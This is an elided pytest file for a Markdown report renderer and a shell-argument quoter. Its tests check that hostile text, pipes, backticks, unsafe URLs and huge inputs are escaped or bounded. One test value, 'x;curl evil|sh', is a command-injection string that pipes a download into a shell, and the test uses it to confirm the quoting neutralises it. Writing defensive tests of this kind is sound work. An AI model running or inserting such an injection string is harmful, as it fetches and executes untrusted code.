...
def test_renders_every_required_section() -> None:
...
def test_footer_names_the_tool_and_the_rerun_command() -> None:
    out = render_markdown_result(full_result())
...
def test_top_evidence_carries_its_upstream_permalink() -> None:
    out = render_markdown_result(full_result())
    assert f"[`src/hdr.c` lines 400-412]({REPO}/blob/{COMMIT}/src/hdr.c#L400-L412)" in out


def test_claim_row_shows_the_outcome_and_the_evidence() -> None:
    out = render_markdown_result(full_result())
...
def test_a_claim_no_check_covered_is_unchecked_not_refuted() -> None:
...
def test_a_refutation_outranks_a_supporting_finding_on_the_same_claim() -> None:
    result = make_result(
...
def test_render_markdown_accepts_a_check_report_and_shows_the_arithmetic() -> None:
    result = full_result()
    ledger = Ledger(
        prior=0.0,
        contributions=(
...
def test_a_result_without_a_verdict_still_renders() -> None:
...
def test_markdown_is_byte_identical_across_runs() -> None:
    assert render_markdown_result(full_result()) == render_markdown_result(full_result())


def test_markdown_carries_no_timings_and_no_clock() -> None:
    out = render_markdown_result(full_result())
...
def test_evidence_order_does_not_depend_on_input_order() -> None:
    items = tuple(
        make_evidence(
...
def test_hostile_text_never_opens_an_html_element(payload: str) -> None:
    result = make_result(
...
@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_text_keeps_every_table_row_the_same_width(payload: str) -> None:
    result = make_result(
...
def test_pipes_in_a_cell_are_escaped_not_dropped() -> None:
...
def test_triple_backticks_in_an_excerpt_cannot_close_the_fence() -> None:
    excerpt = "before\n```\n</details>\n````\nafter"
    out = render_markdown_result(
        make_result(
            claims=(make_claim("x"),),
...
def test_backticks_in_a_value_cannot_escape_a_code_span() -> None:
...
def test_escape_inline_flattens_and_escapes() -> None:
...
def test_a_very_long_single_line_is_bounded_everywhere() -> None:
    huge = "A" * 300_000
    result = make_result(
...
def test_an_unsafe_permalink_is_never_turned_into_a_link() -> None:
    out = render_markdown_result(
        make_result(
            claims=(make_claim("x"),),
...
def test_link_only_accepts_plain_https_urls() -> None:
...
def test_a_hostile_repo_url_stays_inside_a_code_span() -> None:
    result = make_result(
...
def test_a_huge_result_stays_under_the_github_limit() -> None:
    out = render_markdown_result(huge_result())
    assert len(out) <= MAX_CHARS
    assert len(out) > 1_000, "the document should still be useful, not empty"


def test_truncation_is_stated_in_the_output() -> None:
    out = render_markdown_result(huge_result())
...
def test_evidence_details_are_dropped_before_questions() -> None:
    out = render_markdown_result(huge_result())
...
def test_questions_are_never_cut_below_three() -> None:
...
def test_a_small_result_is_not_truncated() -> None:
    out = render_markdown_result(full_result())
    assert "shortened to fit" not in out
    assert "Evidence details (1)" in out


def test_the_hard_cut_still_closes_every_block() -> None:
...
def test_the_size_cap_is_the_documented_one() -> None:
...
def test_result_json_is_byte_identical_across_runs_without_timings() -> None:
...
def test_result_json_keys_are_sorted() -> None:
    payload = full_result().to_json()
    keys = list(json.loads(payload).keys())
    assert keys == sorted(keys)


def test_only_timings_differ_between_two_runs_of_the_same_input() -> None:
...
def test_rerun_command_shell_quotes_report_derived_arguments() -> None:
...
def test_rerun_command_stays_on_one_line_with_control_characters_visible(uri: str) -> None:
    report = Report(
        id="report-1",
    ...
    assert not any(unicodedata.category(c)[0] in "CZ" and c != " " for c in command), repr(command)
    assert "$'" in command
    footer = render_markdown_result(make_result(report=report)).splitlines()[-1]
    assert footer.startswith("Generated by Nikasha v")


@pytest.mark.parametrize(
    "value",
    ["a\nb", "x;curl evil|sh\n", "it's\\\u202e\u0007\t\r\u2028 end", "plain", "O'Neil"],
)
def test_shell_arg_round_trips_through_a_real_shell(value: str) -> None:
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash is not installed")
    quoted = shell_arg(value)
    assert "\n" not in quoted
    # A shell reads the quoted word back as exactly one argument with the original text.
    # The script goes in on stdin, as a pasted line would: on Windows a command-line
    # argument is re-parsed (backslashes included) before bash ever sees it.
    out = subprocess.run(
        [bash, "-s"],
        input=f'printf "%s\\0" {quoted}\n'.encode(),
        capture_output=True,
        check=True,
    ).stdout
    assert out.split(b"\0")[:-1] == [value.encode()]
